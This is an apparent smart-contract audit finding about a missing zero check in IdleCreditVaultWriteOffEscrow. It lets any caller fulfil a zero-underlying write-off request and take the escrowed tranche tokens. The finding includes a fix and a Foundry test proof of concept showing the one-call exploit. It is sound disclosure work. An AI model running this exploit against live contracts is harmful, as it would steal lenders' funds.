### Title
Zero `underlyingsRequested` write-off request lets anyone steal escrowed tranche tokens for free - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
Analogous to the `fillThreshold == 0` partial-fill bug, `IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates that the tranche `amount` is non-zero but never validates `underlyingsRequested`. A lender who creates a write-off request with `underlyingsRequested = 0` has their tranche tokens escrowed, and any unprivileged caller can then execute `fullfillWriteOffRequest` paying 0 underlying and receiving the full tranche balance — a trivial "fill" that drains the request.

### Finding Description
`createWriteOffRequest` pulls `amount` tranche tokens from the lender and stores `WriteOffRequest{tranches, underlyings}` where `underlyings` is user-controlled and unchecked against zero [1](#0-0) . The only zero check is `if (amount == 0) revert NotAllowed();` on the tranche leg [2](#0-1) .

In `fullfillWriteOffRequest`, the match check is `currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings` [3](#0-2) . When `currentRequest.underlyings == 0`, passing `_underlyings = 0` satisfies the check. The fulfiller then `safeTransferFrom`s 0 underlying, pays 0 exit fee, sends the user 0 underlying, and receives `currentRequest.tranches` tranche tokens for free [4](#0-3) . The function is explicitly callable by "any wallet" (line 122), so no borrower or KYC gating applies.

### Impact Explanation
Direct theft of escrowed tranche tokens. A lender who submits a write-off request with `underlyingsRequested = 0` (misconfiguration, default 0 in a frontend, or a request intended only as a placeholder) permanently loses the escrowed tranche tokens: the request is `delete`d on fulfillment, so `deleteWriteOffRequest` can no longer recover them. The attacker receives claim-worthy tranche tokens redeemable for underlying through the normal withdraw/claim flows at effectively zero cost. Loss is the full escrowed tranche amount times the tranche price.

### Likelihood Explanation
The lender-side mistake (passing 0 for the requested-underlyings leg) mirrors the report's `fillThreshold = 0` case — a plausible user/frontend default. Exploitation is trivial: a single `fullfillWriteOffRequest(user, tranches, 0)` call by any EOA, requiring no capital, no KYC, and no privileged role. The request must be created while the epoch is running (`EpochNotRunning` guard), but fulfillment has no epoch gating.

### Recommendation
Reject zero-value requests at creation and at fulfillment, mirroring the `amount == 0` check:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol
function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
    ...
}
```

Optionally, also enforce a minimum `underlyings` relative to `tranches` (e.g. a floor on implied price) to prevent economically trivial fills.

### Proof of Concept
Foundry fork PoC (extend `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol` style):

```solidity
function testZeroUnderlyingsRequestDrainedForFree() external {
    // epoch is running (setup as in testCreateWriteOffRequest)
    uint256 requestedTranches = 10000e18;

    // LP mistakenly creates a request asking for 0 underlying
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    address attacker = makeAddr("attacker");
    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    uint256 lpUnderlyingPre = underlying.balanceOf(LP);

    // any EOA fulfills with 0 underlying and receives all escrowed tranches
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, requestedTranches);
    assertEq(underlying.balanceOf(LP), lpUnderlyingPre); // LP got nothing
    (uint256 t, uint256 u) = escrow.userRequests(LP);
    assertEq(t, 0); // request deleted; tokens unrecoverable
}
```

Note the borrower's underpay guard cannot help: `_underlyings < currentRequest.underlyings` is `0 < 0 == false`, so the WrongRequest revert never fires [5](#0-4) .

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
